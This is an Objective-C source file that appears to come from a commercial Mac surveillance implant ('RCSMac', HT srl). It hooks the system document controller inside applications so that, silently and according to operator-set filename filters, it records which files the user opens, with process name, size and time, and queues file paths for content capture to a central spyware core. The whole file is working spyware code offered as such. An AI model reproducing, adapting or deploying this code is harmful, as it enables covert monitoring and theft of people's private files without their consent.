//
//  RCSMAgentFileCapture.m
//  RCSMac
//
//  Created by revenge on 4/22/11.
//  Copyright 2011 HT srl. All rights reserved.
//

#import "RCSMAgentFileCapture.h"
#import "RCSMInputManager.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

typedef struct _fileConfiguration {
  u_int minFileSize;
  u_int maxFileSize;
  u_int hiMinDate;
  u_int loMinDate;
  u_int reserved1;
  u_int reserved2;
  u_int noFileOpen;
  u_int acceptCount;
  u_int denyCount;
  char patterns[1]; // wchar_t
} fileStruct;

static BOOL gIsFileCaptureActive    = NO;
static BOOL gIsFileOpenActive       = NO;
static NSUInteger gMinSize          = 0;
static NSUInteger gMaxSize          = 0;
static NSDate *gFromDate            = nil;
static NSMutableArray *gIncludeList = nil;
static NSMutableArray *gExcludeList = nil;

BOOL FCStopAgent()
{
  if (gIsFileCaptureActive == NO && gIsFileOpenActive == NO)
  {
#ifdef DEBUG_FILE_CAPTURE
    warnLog(@"File Capture agent is already stopped");
#endif
    return YES;
  }
  
  gIsFileOpenActive     = NO;
  gIsFileCaptureActive  = NO;
  
  [gFromDate release];
  [gIncludeList release];
  [gExcludeList release];
  
  gIncludeList = nil;
  gExcludeList = nil;
  
  return YES;
}

BOOL FCStartAgent()
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  BOOL success = YES;

#ifdef DEBUG_FILE_CAPTURE
  infoLog(@"Setting up agent file capture parameters");
#endif

  if (gIsFileOpenActive == YES || gIsFileCaptureActive == YES)
    {
#ifdef DEBUG_FILE_CAPTURE
      warnLog(@"File agent is already active");
#endif
      return YES;
    }

  //
  // Read configuration
  //
  NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
                                                                 forAgent: AGENT_INTERNAL_FILECAPTURE
                                                          withCommandType: CM_AGENT_CONF];
  
  if (readData != nil)
    {
#ifdef DEBUG_FILE_CAPTURE
      infoLog(@"Found configuration for Agent File Capture");
#endif
      shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
      NSMutableData *confData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                              length: shMemLog->commandDataSize];
#ifdef DEBUG_FILE_CAPTURE
      verboseLog(@"confData: %@", confData);
#endif

      fileStruct *fileConfiguration = (fileStruct *)[confData bytes];
      if (fileConfiguration->noFileOpen == 0) 
        {
#ifdef DEBUG_FILE_CAPTURE
          infoLog(@"file open is active");
#endif
          gIsFileOpenActive = YES;
        }
      else
        {
#ifdef DEBUG_FILE_CAPTURE
          warnLog(@"file open is not active");
#endif
          gIsFileOpenActive = NO;
        }

      if (fileConfiguration->minFileSize > 0)
        {
#ifdef DEBUG_FILE_CAPTURE
          infoLog(@"file capture is active");
#endif
          gIsFileCaptureActive = YES;
        }
      else
        {
#ifdef DEBUG_FILE_CAPTURE
          warnLog(@"file capture is not active");
#endif
          gIsFileCaptureActive = NO;
        }

      int64_t _minDate = ((int64_t)fileConfiguration->hiMinDate << 32) | fileConfiguration->loMinDate;
      int64_t minDate  = (_minDate - EPOCH_DIFF) / RATE_DIFF;

      gMinSize  = fileConfiguration->minFileSize;
      gMaxSize  = fileConfiguration->maxFileSize;
      gFromDate = [[NSDate dateWithTimeIntervalSince1970: minDate] retain];

      if (gIncludeList == nil)
        gIncludeList = [[NSMutableArray alloc] init];
      if (gExcludeList == nil)
        gExcludeList = [[NSMutableArray alloc] init];

#ifdef DEBUG_FILE_CAPTURE
      infoLog(@"minSize    : %ld", gMinSize);
      infoLog(@"maxSize    : %ld", gMaxSize);
      infoLog(@"date       : %@", gFromDate);
      infoLog(@"acceptCount: %d", fileConfiguration->acceptCount);
      infoLog(@"denyCount  : %d", fileConfiguration->denyCount);
#endif

      int i   = 0;
      off_t z = 0;

      for (; i < fileConfiguration->acceptCount; i++)
        {
          unichar *_entry = (unichar *)(fileConfiguration->patterns + z);
#ifdef DEBUG_FILE_CAPTURE
          infoLog(@"accept: %S", _entry);
#endif
          int len = _utf16len(_entry);
          z += len * 2 + sizeof(short); // utf16 + null

          NSString *entry = [[NSString alloc] initWithCharacters: _entry
                                                          length: len];
          [gIncludeList addObject: entry];
          [entry release];
        }
      
      for (i = 0; i < fileConfiguration->denyCount; i++)
        {
          unichar *_entry = (unichar *)(fileConfiguration->patterns + z);
#ifdef DEBUG_FILE_CAPTURE
          infoLog(@"deny: %S", _entry);
#endif
          int len = _utf16len(_entry);
          z += len * 2 + sizeof(short); // utf16 + null

          NSString *entry = [[NSString alloc] initWithCharacters: _entry
                                                          length: len];
          [gExcludeList addObject: entry];
          [entry release];
        }

      [confData release];
    }
  else
    {
#ifdef DEBUG_FILE_CAPTURE
      warnLog(@"No configuration found for agent File Capture");
#endif
    }
  
  [outerPool release];
  return success;
}

int compareEntries(const unsigned char *wild, const unsigned char *string)
{
  const unsigned char *cp = NULL, *mp = NULL;
  
  while ((*string) && (*wild != '*'))
  {
    if ((toupper((unsigned int)*wild) != toupper((unsigned int)*string))
        && (*wild != '?'))
    {
      return 0;
    }
    wild++;
    string++;
  }
  
  while (*string)
  {
    if (*wild == '*')
    {
      if (!*++wild)
      {
        return 1;
      }
      mp = wild;
      cp = string+1;
    } 
    else if ((toupper((unsigned int)*wild) == toupper((unsigned int)*string))
             || (*wild == '?'))
    {
      wild++;
      string++;
    }
    else 
    {
      wild = mp;
      string = cp++;
    }
  }
  while (*wild == '*')
  {
    wild++;
  }
  
  return !*wild;
}

BOOL needToLogEntry(NSString *entry)
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  BOOL needToLog = NO;
  
  if (gIncludeList == nil || gExcludeList == nil)
  {
#ifdef DEBUG_FILE_CAPTURE
    errorLog(@"Filters are empty");
#endif
    
    return needToLog;
  }
  
  NSString *procToMatch = nil;
  NSString *filter = entry;
  
#ifdef DEBUG_FILE_CAPTURE
  infoLog(@"Checking       : %@", entry);
#endif
  
  // Check if we have a proc name inside our filter
  if ([entry rangeOfString: @"|"].location != NSNotFound)
  {
    procToMatch = [[entry componentsSeparatedByString: @"|"] objectAtIndex: 0];
    filter      = [[entry componentsSeparatedByString: @"|"] objectAtIndex: 1];
    
    NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
    NSString *currentProc       = [[processInfo processName] copy];
    
    if ([procToMatch isEqualToString: currentProc] == NO)
    {
#ifdef DEBUG_FILE_CAPTURE
      warnLog(@"Process name not matched, current (%@) required (%@)", currentProc, procToMatch);
#endif
      [currentProc release];
      [outerPool release];
      return needToLog;
    }
    else
    {
#ifdef DEBUG_FILE_CAPTURE
      infoLog(@"Process matched (%@)", currentProc);
#endif
    }
    
    [currentProc release];
  }
  else
  {
#ifdef DEBUG_FILE_CAPTURE
    warnLog(@"No process configured");
#endif
  }
  
  // Check include list
  int i = 0;
  for (; i < [gIncludeList count]; i++)
  {
    NSString *item = [gIncludeList objectAtIndex: i];
#ifdef DEBUG_FILE_CAPTURE
    infoLog(@"Checking %@ against INCLUDE filter %@", item, filter);
#endif
    if (compareEntries((const unsigned char *)[item UTF8String],
                       (const unsigned char *)[filter UTF8String]))
    {
#ifdef DEBUG_FILE_CAPTURE
      infoLog(@"Matched include (%@) for entry (%@)", filter, item);
#endif
      needToLog = YES;
      break;
    }
  }
  
  // If we didn't find anything inside the include list just return
  if (needToLog == NO)
  {
#ifdef DEBUG_FILE_CAPTURE
    warnLog(@"No filter matched");
#endif
    return needToLog;
  }
  
  // Check the exclude list
  for (i = 0; i < [gExcludeList count]; i++)
  {
    NSString *item = [gExcludeList objectAtIndex: i];
#ifdef DEBUG_FILE_CAPTURE
    infoLog(@"Checking %@ against EXCLUDE filter %@", item, filter);
#endif
    if (compareEntries((const unsigned char *)[item UTF8String],
                       (const unsigned char *)[filter UTF8String]))
    {
#ifdef DEBUG_FILE_CAPTURE
      infoLog(@"Matched exclude (%@) for entry (%@)", filter, item);
#endif
      needToLog = NO;
      break;
    }
  }
  
  [outerPool release];
  return needToLog;
}

void logFileContent(NSString *filePath)
{
  NSString *tmpPath = filePath;
  char nullTerminator = 0x00;
  
  if ([filePath rangeOfString: @"file://localhost"].location != NSNotFound)
  {
    tmpPath = [[filePath componentsSeparatedByString: @"file://localhost"]
               objectAtIndex: 1];
  }
  else
  {
#ifdef DEBUG_FILE_CAPTURE
    warnLog(@"Couldn't normalize path %@", filePath);
#endif
  }
  
  NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData = [[NSMutableData alloc] init];
  
  // Filename UTF16 Null-terminated
  [entryData appendData: [tmpPath dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendBytes: &nullTerminator
                  length: sizeof(char)];
  [entryData appendBytes: &nullTerminator
                  length: sizeof(char)];
  
  shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_INTERNAL_FILECAPTURE;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  if ([mSharedMemoryLogging writeMemory: logData
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
  {
#ifdef DEBUG_FILE_CAPTURE
    verboseLog(@"File path to log sent (%@)", filePath);
#endif
  }
  else
  {
#ifdef DEBUG_FILE_CAPTURE
    errorLog(@"Error while sending file path to log (%@)", filePath);
#endif
  }
  
  [entryData release];
  [logData release];
}

void logFileOpen(NSString *filePath)
{
  NSMutableData *processName;

  NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData = [[NSMutableData alloc] init];

  NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
  NSString *_processName      = [[processInfo processName] copy];

  time_t rawtime;
  struct tm *tmTemp;

  processName  = [[NSMutableData alloc] initWithData:
                  [_processName dataUsingEncoding:
                   NSUTF8StringEncoding]];
  char nullTerminator = 0x00;

  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;

  if (sizeof(long) == 4) // 32bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
  else if (sizeof(long) == 8) // 64bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
    }

  // Process Name - ASCII null terminated
  [entryData appendData: processName];
  [entryData appendBytes: &nullTerminator
                  length: sizeof(char)];

  // File Size (2 dwords hi-lo)
  NSUInteger filesize;
  NSString *tmpPath = nil;
  
  if ([filePath rangeOfString: @"file://localhost"].location != NSNotFound)
    {
      tmpPath = [[filePath componentsSeparatedByString: @"file://localhost"]
                 objectAtIndex: 1];
    }

  NSDictionary *fileAttributes;
  if (tmpPath != nil)
    {
      fileAttributes = [[NSFileManager defaultManager]
        attributesOfItemAtPath: tmpPath
                         error: nil];
      filesize = [fileAttributes fileSize];
    }
  else
    {
#ifdef DEBUG_FILE_CAPTURE
      errorLog(@"tmpPath is nil due to filePath being %@", filePath);
#endif
      filesize = 0;
    }


  uint32_t hiSize = (int64_t)filesize >> 32;
  uint32_t loSize = filesize & 0xFFFFFFFF;
  
#ifdef DEBUG_FILE_CAPTURE
  infoLog(@"fileSize: %ld", filesize);
  infoLog(@"lo      : %d", loSize);
  infoLog(@"hi      : %d", hiSize);
#endif

  [entryData appendBytes: &hiSize
                  length: sizeof(hiSize)];
  [entryData appendBytes: &loSize
                  length: sizeof(loSize)];
  
  // Flags (Win masks for read-write)
  uint32_t flags = 0;
  [entryData appendBytes: &flags
                  length: sizeof(flags)];

  // Filename UTF16 Null-terminated
  [entryData appendData: [filePath dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendBytes: &nullTerminator
                  length: sizeof(char)];
  [entryData appendBytes: &nullTerminator
                  length: sizeof(char)];

  // Delimiter
  uint32_t del = LOG_DELIMITER;
  [entryData appendBytes: &del
                  length: sizeof(del)];

  shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_INTERNAL_FILEOPEN;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];

  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);

  if ([mSharedMemoryLogging writeMemory: logData
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_FILE_CAPTURE
      verboseLog(@"File open logged (%@)", filePath);
#endif
    }
  else
    {
#ifdef DEBUG_FILE_CAPTURE
      errorLog(@"Error while logging file open to shared memory (%@)", filePath);
#endif
    }

  [_processName release];
  [processName release];
  [entryData release];
  [logData release];
}

@implementation myNSDocumentController : NSObject

- (id)openDocumentWithContentsOfURLHook: (NSURL *)absoluteURL
                                display: (BOOL)displayDocument
                                  error: (NSError **)outError
{
  id result = [self openDocumentWithContentsOfURLHook: absoluteURL
                                              display: displayDocument
                                                error: outError];
  BOOL shouldLog = NO;

  if (gIsFileOpenActive)
    {
#ifdef DEBUG_FILE_CAPTURE
      infoLog(@"File Open active");
#endif

      NSString *path = [absoluteURL absoluteString];

      if (needToLogEntry(path))
        {
          shouldLog = YES;

#ifdef DEBUG_FILE_CAPTURE
          infoLog(@"Logging file open (%@)", path);
#endif
          logFileOpen(path);
        }
      else
        {
#ifdef DEBUG_FILE_CAPTURE
          warnLog(@"File open (%@) didn't match filters");
#endif
        }
    }
  else
    {
#ifdef DEBUG_FILE_CAPTURE
      warnLog(@"File open inactive");
#endif
    }

  if (gIsFileCaptureActive)
    {
#ifdef DEBUG_FILE_CAPTURE
      infoLog(@"File Capture active");
#endif

      NSString *path = [absoluteURL absoluteString];
      if (shouldLog || needToLogEntry(path))
        {
#ifdef DEBUG_FILE_CAPTURE
          infoLog(@"Logging content (%@)", path);
#endif
          logFileContent(path);
        }
      else
        {
#ifdef DEBUG_FILE_CAPTURE
          warnLog(@"File capture (%@) didn't match filters");
#endif
        }
    }
  else
    {
#ifdef DEBUG_FILE_CAPTURE
      warnLog(@"File content inactive");
#endif
    }

  return result;
}

@end
